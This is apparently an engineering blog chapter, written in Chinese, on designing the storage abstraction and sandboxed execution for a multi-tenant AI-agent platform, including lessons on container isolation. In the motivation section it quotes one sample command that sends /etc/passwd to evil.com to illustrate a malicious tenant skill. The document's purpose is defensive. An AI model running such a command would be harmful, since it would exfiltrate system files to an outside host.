---
title: 沙箱与文件系统
eyebrow: "Chapter 3 · Sandbox & Filesystem"
tldr: 当 Agent 从单机工具变成多租户 SaaS，"脚本和文件天然在同一个地方"这个前提就失效了。我为 Corevo 内核设计了一套以 StorageProvider 为存储抽象、以 SandboxExecutor 为执行边界的全沙箱执行模型：对象存储是唯一事实源，沙箱容器以 job 为最小隔离单元，宿主代理一切 I/O。
date: "2026-10"
---

## 为什么 Agent 需要自己的文件系统

Claude Code 的 bash 工具极简——输入是 `{command, timeout}`，输出是 `{stdout, stderr, exit_code}`。它能这么简单，是因为一个隐含前提：**执行环境就是文件系统本身**。脚本和文件天然在同一台机器的同一个地方，不需要任何搬运，复杂性被"文件已在原地"吸收掉了。

Moss 在单机时代也吃到了这个前提的红利：Skill 的 `scripts/` 直接通过 bash 工具在宿主进程里跑，自定义 Tool 用 `importlib` 在主进程里动态加载。但当我把内核推向多租户 SaaS 时，这个前提彻底失效了——脚本躺在对象存储里，执行容器是临时创建的，输出要回传给另一个用户。更要命的是安全：一个恶意租户在 Skill 里写一行 `curl evil.com --data "$(cat /etc/passwd)"`，Agent 就会忠实地执行它；`importlib` 动态加载 `.py` 文件则是一个赤裸裸的 RCE 入口。

所以文件系统与沙箱不是两个独立的优化项，而是同一件事的正反两面：**文件系统决定"资产在哪里、谁能看到"，沙箱决定"不可信代码在哪里跑、能碰到什么"**。

## 目录结构契约：文件系统即配置

改造的第一步是给所有资产立一份目录契约。Moss 一直坚持"文件系统即配置"——新增一个 Skill 不需要写注册代码，放一个目录到 `skills/` 下就会被自动发现。SaaS 化之后，这套哲学被提升为带租户前缀的层级结构：

```text
tenants/{tenant_id}/                ← StorageProvider.get_tenant_dir(tid)
├── skills/
│   └── {skill_name}/
│       ├── SKILL.md                ← 技能定义（frontmatter + body）
│       ├── scripts/                ← 可执行脚本（沙箱内运行）
│       ├── references/             ← 参考文档
│       └── manifest.json           ← 发布签名（可选）
├── tools/
│   └── {tool_name}/
│       ├── tool.json               ← 工具元数据
│       └── main.py                 ← 工具实现
└── subagents/
    └── {subagent_name}/
        └── agent.md                ← 子 Agent 定义

agents/{agent_id}/                  ← Agent 运行时目录
├── config.yaml
├── sessions/{session_id}/files/
├── memories/{user_id}/
└── files/                          ← 跨会话共享
```

落到对象存储上，它对应一个三级映射：`platform/` 是随内核版本发布的内置资产，`tenants/{tid}/` 是租户自有资产，`sessions/{tid}/{aid}/{sid}/` 是用户级运行时产物。值得强调的是：**租户级和用户级在 K8s 里不是独立的 Pod，只是数据层面的分区**——隔离靠代码里的租户上下文贯穿，而不是给每个租户开容器。

## StorageProvider：一行路径都不许硬编码

目录契约要生效，前提是没有任何代码绕过它。旧代码里 `data/teams/{tid}/skills/` 这类路径硬编码得到处都是，改造时我立了一条铁律：**所有 I/O 必须经过 StorageProvider 抽象层**：

```python
class StorageProvider(ABC):
    def get_data_dir(self) -> Path
    def get_agent_dir(self, agent_id: str) -> Path
    def get_session_dir(self, agent_id: str, session_id: str) -> Path

    # 新增：租户资产目录
    def get_tenant_dir(self, tenant_id: str) -> Path
    def get_tenant_skills_dir(self, tenant_id: str) -> Path
    def get_tenant_tools_dir(self, tenant_id: str) -> Path

    # 多节点场景：对象存储 → 本地缓存
    def sync_tenant_assets(self, tenant_id: str) -> None
    def on_asset_changed(self, tenant_id: str, asset_type: str, callback) -> None
```

多节点部署时租户资产在对象存储里，但 Agent 的 `read()` 工具需要本地路径。我的解法是**本地缓存层**而不是改造所有文件工具：首次访问时把租户目录同步到本地缓存，再在 workspace 里建软链接，`read()` 看到的还是普通路径，对 MinIO 完全无感知。缓存失效走写穿（写对象存储后同步本地并广播）加 ETag 读时校验，再加一个 TTL 兜底防止变更消息丢失。这个决定让文件工具零改动，是整次改造里性价比最高的一步。

## 全沙箱执行：三段式模型

既然"文件已在原地"不成立，就要主动重建它。我设计的方案叫**全沙箱执行**：所有自定义代码——Skill 脚本、租户 Tool——一律不在内核进程里跑，而是 spawn 一个秒级生命周期的沙箱容器，用三段式模型把文件搬运收敛到宿主侧：

```text
┌─────────┐      ① Pre-stage        ② Execution      ③ Post-stage
│ 对象存储 │ ───▶ 实体化 workspace ──▶ 容器内执行 ────▶ 收集 output/ ──▶ 回传 LLM
│ (S3)    │      下载脚本+输入       完全不感知外部     上传产物+预签名URL
└─────────┘      （Host 执行）       （沙箱执行）       （Host 执行）
```

执行的完整上下文被打包成一张"施工任务单" `SandboxJob`：容器内命令、需要实体化的输入文件列表、输出收集的 glob 模式、资源约束（超时、内存、CPU）和网络开关。核心原则是**宿主负责所有对象存储 I/O，凭据不进容器**——容器网络可以收紧到默认无外联，文件进出的审计也集中在宿主一层。对脚本作者，契约只剩一句话：需要交付的文件写到 `/workspace/output/`，其余随意。

并发隔离的单元是 **job_id，不是 tenant_id**。同一用户并发触发两个 Skill，就是两个 job、两个独立 workspace、两个容器，互不可见。

## 边界与教训：Pod 不是信任边界

容器怎么 spawn 也有讲究。直接挂载 Docker socket 等价于把 root 交出去，我最终选择了 sidecar 模式：内核 Pod 无特权，通过一个独立的 sandbox-runner 服务接收 `SandboxJob`、负责拉起容器，底层执行引擎（Docker / gVisor / Firecracker）可以随时替换。

最深的教训来自一次现场复核：我们一度以为"脚本进了 Pod"就等于隔离完成，但实际上租户根目录被整棵挂进了沙箱、网络策略允许公网直连、控制面 token 通过环境变量泄漏给同 Pod 的不可信脚本。**Pod 隔离了宿主机，却没有把不可信代码和运行时数据隔开。** 修复的方向也因此明确：只挂本次任务显式声明的资产、默认无网络按白名单放行、对称密钥换成"内核持私钥签名、执行侧只有公钥验证"的非对称模型。

> 我学到的最重要的一课：隔离强度要靠恶意探针来验收，而不是靠读 PodSpec。能在发布门禁里被断言的边界，才是真边界；约定层面的隔离，总会在某一天被物理现实戳穿。
